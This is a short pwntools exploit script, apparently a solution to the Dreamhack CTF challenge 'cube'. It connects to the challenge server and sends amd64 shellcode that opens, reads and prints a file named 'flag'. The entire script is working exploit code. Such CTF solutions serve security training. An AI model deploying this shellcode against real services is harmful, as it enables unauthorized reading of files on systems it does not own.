#!/usr/bin/env python3
from pwn import *

p = remote('host3.dreamhack.games', 10411)
# p = process('./cube')
e = ELF('./cube')
context.arch = 'amd64'


shellcode = asm('''
    /* ---- open("flag", O_RDONLY) ---- */
    mov  eax, 0x67616c66
    push rax
    push rsp
    pop  rdi                    /* rdi = 문자열 주소 */
    xor  esi, esi               /* rsi = 0 (O_RDONLY) */
    push 2
    pop  rax                    /* rax = 2 (open) */
    syscall                     /* -> rax = fd */

    /* ---- read(fd, rsp-0x100, 0x100) ---- */
    mov  rdi, rax               /* rdi = fd */
    push rsp
    pop  rsi
    sub  rsi, 0x100
    push 0x100
    pop  rdx                    /* rdx = 0x100 */
    xor  eax, eax               /* rax = 0 (read) */
    syscall

    /* ---- write(1, buf, n) ---- */
    mov  edx, eax
    push 1
    pop  rax                    /* rax = 1 (write) */
    push 1
    pop  rdi                    /* rdi = 1 (stdout) */
    syscall
''')

p.sendafter(b'Give me shellcode: ', shellcode)
p.interactive()
